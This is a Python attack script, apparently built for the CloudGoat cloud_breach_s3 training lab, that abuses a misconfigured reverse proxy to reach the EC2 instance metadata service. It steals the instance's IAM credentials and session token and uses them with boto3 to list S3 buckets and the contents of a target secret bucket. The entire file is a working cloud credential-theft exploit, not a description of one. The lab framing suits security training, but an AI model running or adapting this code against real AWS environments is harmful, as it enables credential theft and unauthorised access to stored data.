import boto3
import json
import requests
import sys
import csv


# This script will get high privileged EC2 instance credentials via reverse proxy vulnerability
# Then sensitive date will be obtained from s3 buckets using the high privileged credentials
# As the result it will invoke the lamda funcition to indicate the success of the attack
# https://resources.infosecinstitute.com/topic/cloudgoat-walkthrough-series-cloud-breach-s3/

# Load credentials from .secure/credentials.json
with open('.secure/credentials.json', 'r') as file:
    credentials = json.load(file)

# Load credentials from appropriate profile 
credentials_profile='scenario2'

access_key_id=credentials[credentials_profile]['aws_access_key_id']
secret_access_key=credentials[credentials_profile]['aws_secret_access_key']
region=credentials[credentials_profile]['region']
lambda_function_name=credentials[credentials_profile]['lambda_function_name']
reverse_proxy_ip=credentials[credentials_profile]['reverse_proxy_ip']
s3_secret_bucket_name=credentials[credentials_profile]['s3_secret_bucket_name']


proxy_url = 'http://' + reverse_proxy_ip + '/latest/meta-data/iam/security-credentials'
proxy_headers = {'Host': '169.254.169.254'}

response = requests.get(proxy_url, headers=proxy_headers)
if response.status_code == 200:
    proxy_url = proxy_url + '/' + response.text
    response = requests.get(proxy_url, headers=proxy_headers)

    if response.status_code == 200:
        print('SUCCESS:High privileged EC2 instance credentials obtained')
        data = response.json()
        ec2_access_key = data['AccessKeyId']
        ec2_secret_key = data['SecretAccessKey']
        ec2_token = data['Token']
    else:
        print('Error:', response.status_code)
        sys.exit(1)
else:
    print('Error:', response.status_code)
    sys.exit(1)


s3 = boto3.client(
     's3',
     aws_access_key_id=ec2_access_key,
        aws_secret_access_key=ec2_secret_key,
        aws_session_token=ec2_token,
        region_name=region
)

# Find target bucket among all buckets

for bucketname in s3.list_buckets()['Buckets']:
    if (bucketname['Name']== s3_secret_bucket_name):
        print ('SUCCESS:Vulnerable bucket detected:', bucketname['Name'])
        print ('<==========List of objects in the bucket:')
        for object in s3.list_objects(Bucket=bucketname['Name'])['Contents']:
            print (object['Key'])
            
